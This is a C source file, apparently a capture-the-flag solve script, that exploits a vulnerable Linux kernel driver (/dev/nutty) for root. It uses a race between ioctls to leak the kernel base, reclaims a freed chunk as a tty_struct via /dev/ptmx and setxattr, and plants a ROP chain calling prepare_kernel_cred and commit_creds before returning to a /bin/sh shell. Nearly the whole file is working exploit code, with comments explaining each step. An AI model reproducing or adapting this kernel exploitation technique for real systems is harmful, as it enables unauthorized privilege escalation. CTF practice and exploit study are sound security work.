#include <stdio.h>
#include <syscall.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <assert.h>
#include <string.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <pty.h>
#include <stdint.h>
#include <stdbool.h>
#include <sys/shm.h>

// compile command : gcc -static -masm=intel ./solve.c 

// Here we can allcoate a chunk of size 0x400 maximum.
// And store it in the corresponding index.
#define IOCTL_ALLOC 0x13371

// We need to provide a good index, so our chunk can be freed.
// No UAF here.
#define IOCTL_FREE 0x13372

// We can get the content of out allocated buffer.
// Here maybe I can use the race condition (no locks used) to free and show im-
// mediately after it's being nulled.
// We need to provide a good index and a userland buffer aswell.
#define IOCTL_SHOW 0x13373 

// This ioctl is made to extend an already allocated chunk, the extend size pl-
// us the size already in that chunk should be less than 0x400.
// It will allocate a new chunk with the size (old size + new size) the whole 
// addition should be less than 0x400, then it will store the new content
// starting from the chunk + new_size.
#define IOCTL_EXTEND 0x13374


// This is the struct I'm gonna use to communicate with the vulnerable driver.
struct ioctl_struct {
	uint32_t index;
	uint32_t size;
	uint64_t *content_buffer;
	uint32_t content_size;
	uint64_t *userland_buffer;
};

struct trap_frame {
	uint64_t rip, cs, rflags, rsp, ss;
} tf;

void save_state() {
	asm __volatile__ ("mov tf+8, cs;"
					"pushfq; pop tf+16;"
					"mov tf+24, rsp;"
					"mov tf+32, ss;"
					);
}

struct ioctl_struct* i_s;

int fd;
pthread_t tid;

uint64_t* allocate(uint32_t size, uint32_t content_size) {
	if(size > 0x400) {
		puts("Can't allocate bigger than 0x400");
		return NULL;
	}
	i_s->size = size;
	i_s->content_size = content_size;
	i_s->content_buffer = (uint64_t*)malloc(size);

	memset(i_s->content_buffer, 0x4d, size);
	int ret = ioctl(fd, IOCTL_ALLOC, i_s);
	printf("Allocate of size 0x%x returned : %d\n", size, ret);
	return i_s->content_buffer;
}

void extend(uint32_t index, uint32_t added_size, uint32_t content_size) {
	char buf[0x400];
	memset(buf, 0x4d, sizeof(buf));

	struct ioctl_struct extend_is = {
			.index = index,
			.size = added_size,
			.content_size = content_size,
			.content_buffer = (uint64_t*)buf
	};
	int ret = ioctl(fd, IOCTL_EXTEND, &extend_is);
	//printf("Extend request for 0x%x returned : %d\n", added_size, ret);

}

void delete_nut(uint32_t index) {
	struct ioctl_struct delete_is = {
		.index = index,
	};
	ioctl(fd, IOCTL_FREE, &delete_is);
}

uint64_t show_buf[0x400/sizeof(uint64_t)];

void show(int index) {
	
	struct ioctl_struct show_is = {
		.index = index,
		.userland_buffer = show_buf,
	};
	int ret = ioctl(fd, IOCTL_SHOW, &show_is);
	//printf("Show returned %d\n", ret);
}

void show_leaks() {

		for(int i=0; i<(0x400>>3); i++){
			printf("%p : %p\n", i, show_buf[i]);
		}
}

bool won;

void* extend_(void* d) {
	while(!won) {
		extend(0, 0x0, 0x300);
	}
	return d;
}

void* show_(void* d) {
	while(!won) {
			int tmpfd = open("/proc/self/stat", O_RDONLY);
			show(0);
			if(show_buf[0] != 0x4d4d4d4d4d4d4d4d) {
				won = true;
				//show_leaks();
			}
			close(tmpfd);
	}

	return d;
}

uint64_t kernel_base;

void shell();

void* tty_struct_setxattr(void* d) {
	char buf[0x2e0];
	uint64_t *p = (uint64_t*)show_buf;
	uint64_t pop_rdi_rsi = kernel_base + 0x14ed59;
	uint64_t commit_creds = kernel_base + 0x8c190;
	uint64_t prepare_kernel_cred = kernel_base + 0x8c3c0;
	uint64_t swapgs_restore_regs_and_return_to_usermode = 
			kernel_base + 0xc00df0;
	uint64_t pop_rdi = kernel_base + 0x1bdd;
	uint64_t mov_rdi_rax_rep = kernel_base + 0xa2474b;
	uint64_t pop_rcx = kernel_base + 0x557b5;

	while(!won){
		int tmpfd = open("/dev/ptmx", O_RDWR | O_NOCTTY);
		show(0);

		if(show_buf[0] != 0x4d4d4d4d4d4d4d4d){
			won = true;
			delete_nut(0);
			puts("We have a tty_struct in index 0");
			//show_leaks();
			
			show_buf[1] = pop_rdi_rsi;
			show_buf[3] = show_buf[7] & ~0xfff;
			show_buf[4] = pop_rdi;
			show_buf[5] = 0x0;
			show_buf[6] = prepare_kernel_cred;
			show_buf[7] = pop_rcx;
			show_buf[8] = 0;
			show_buf[9] = mov_rdi_rax_rep;
			show_buf[10] = commit_creds;
			show_buf[11] = pop_rdi;
			show_buf[12] = kernel_base + 0x0cf31;
			show_buf[13] = swapgs_restore_regs_and_return_to_usermode + 0x16;
			show_buf[14] = 0x0;
			show_buf[15] = 0x0;
			show_buf[16] = (uint64_t)&shell;
			show_buf[17] = tf.cs;
			show_buf[18] = tf.rflags;
			show_buf[19] = tf.rsp;
			show_buf[20] = tf.ss;


			assert(setxattr("/tmp", "x", show_buf, 0x2e0, XATTR_CREATE));
			ioctl(tmpfd, 0, NULL);
		}
		close(tmpfd);
	}
	return d;
}

void shell() {
	char *argv[] = {"/bin/sh", NULL};
	execve(argv[0], argv, NULL);
}

int main() {
	fd = open("/dev/nutty", O_RDONLY);
	i_s = (struct ioctl_struct*)malloc(sizeof(struct ioctl_struct));

	assert(fd > 0);
	uint64_t* p;
	
	allocate(0x20, 0x300);
	
	pthread_t e, s;
	won = false;
	
	// To leak a kernel address and reveal the kernel base.
	pthread_create(&e, NULL, extend_, NULL);
	pthread_create(&s, NULL, show_, NULL);
	pthread_join(e, NULL);
	pthread_join(s, NULL);
	
	kernel_base = show_buf[0] - 0x1fa9e0;
	printf("Kernel base @ %p\n", kernel_base);
	printf("Breakpoint here %p\n", kernel_base+0x0cf31);
	delete_nut(0);
	getchar();
	// Trying to do this now :
	// Allocate 0x260 -> extend (To free it) -> show (to make sure we have it 
	// in hand) -> free the tty_struct -> re-alloc it using setxattr -> change
	// the seq_operations pointer to the tty_struct it self -> at offset 12*8 
	// it will be the ioctl pointer we need to have it leave_ret -> ROP inside 
	// the tty_struct -> escalate privs.
	allocate(0x2e0, 0x300);
	won = false;
	
	pthread_t tty;
	save_state();	
	pthread_create(&e, NULL, extend_, NULL);
	pthread_create(&tty, NULL, tty_struct_setxattr, NULL);	
	pthread_join(e, NULL);
	pthread_join(tty, NULL);


	return 0;
}
